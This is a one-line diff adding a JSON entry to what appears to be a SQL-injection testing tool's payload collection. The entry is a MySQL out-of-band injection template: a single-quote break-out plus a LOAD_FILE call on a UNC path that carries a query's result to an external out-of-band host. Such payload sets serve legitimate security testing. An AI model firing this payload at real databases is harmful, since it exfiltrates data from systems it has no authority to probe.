@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "oob", "boundary": {"prefix": "'", "suffix": "/*", "type": "single"}, "vector": "{B} AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({Q}),'.{OOB}\\\\a')))", "comment": "mysql oob: single, block"}
